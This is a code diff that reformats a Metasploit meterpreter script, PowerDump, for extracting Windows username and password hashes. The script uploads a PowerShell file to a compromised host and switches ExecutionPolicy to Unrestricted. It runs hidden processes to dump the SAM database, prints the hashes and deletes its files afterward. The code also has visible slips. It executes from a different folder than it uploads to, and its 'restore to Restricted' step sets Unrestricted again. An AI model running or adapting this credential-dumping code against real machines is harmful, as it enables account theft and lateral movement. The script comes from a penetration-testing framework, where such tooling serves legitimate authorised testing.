@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # Meterpreter script for utilizing purely PowerShell to extract username and password hashes through registry
@@ -34,24 +34,23 @@ end
 # Actual Hashdump here
 
 def dumphash(session)
-
-  path = File.join( Msf::Config.data_directory, "exploits", "powershell" )
+  path = File.join(Msf::Config.data_directory, "exploits", "powershell")
 
   print_status("Running PowerDump to extract Username and Password Hashes...")
-  filename=("#{rand(100000)}.ps1")
-  hash_dump=("#{rand(100000)}")
-  session.fs.file.upload_file("%TEMP%\\#{filename}","#{path}/powerdump.ps1")
+  filename = "#{rand(100000)}.ps1"
+  hash_dump = rand(100000).to_s
+  session.fs.file.upload_file("%TEMP%\\#{filename}", "#{path}/powerdump.ps1")
   print_status("Uploaded PowerDump as #{filename} to %TEMP%...")
   opmode = ""
   print_status("Setting ExecutionPolicy to Unrestricted...")
-  session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, {'Hidden' => 'true', 'Channelized' => true})
+  session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, 'Hidden' => 'true', 'Channelized' => true)
   print_status("Dumping the SAM database through PowerShell...")
-  session.sys.process.execute("powershell C:\\Windows\\Temp\\#{filename} >> C:\\Windows\\Temp\\#{hash_dump}", nil, {'Hidden' => 'true', 'Channelized' => true})
+  session.sys.process.execute("powershell C:\\Windows\\Temp\\#{filename} >> C:\\Windows\\Temp\\#{hash_dump}", nil, 'Hidden' => 'true', 'Channelized' => true)
   sleep(10)
-  hashes=session.fs.file.new("%TEMP%\\#{hash_dump}", "rb")
+  hashes = session.fs.file.new("%TEMP%\\#{hash_dump}", "rb")
   begin
-    while ((data = hashes.read) != nil)
-      data=data.strip
+    while (data = hashes.read) != nil
+      data = data.strip
       print_line(data)
     end
   rescue EOFError
@@ -59,11 +58,10 @@ def dumphash(session)
     hashes.close
   end
   print_status("Setting Execution policy back to Restricted...")
-  session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, {'Hidden' => 'true', 'Channelized' => true})
+  session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, 'Hidden' => 'true', 'Channelized' => true)
   print_status("Cleaning up after ourselves...")
-  session.sys.process.execute("cmd /c del %TEMP%\\#{filename}", nil, {'Hidden' => 'true', 'Channelized' => true})
-  session.sys.process.execute("cmd /c del %TEMP%\\#{hash_dump}", nil, {'Hidden' => 'true', 'Channelized' => true})
-
+  session.sys.process.execute("cmd /c del %TEMP%\\#{filename}", nil, 'Hidden' => 'true', 'Channelized' => true)
+  session.sys.process.execute("cmd /c del %TEMP%\\#{hash_dump}", nil, 'Hidden' => 'true', 'Channelized' => true)
 end
 print_status("PowerDump v0.1 - PowerDump to extract Username and Password Hashes...")
 dumphash(session)
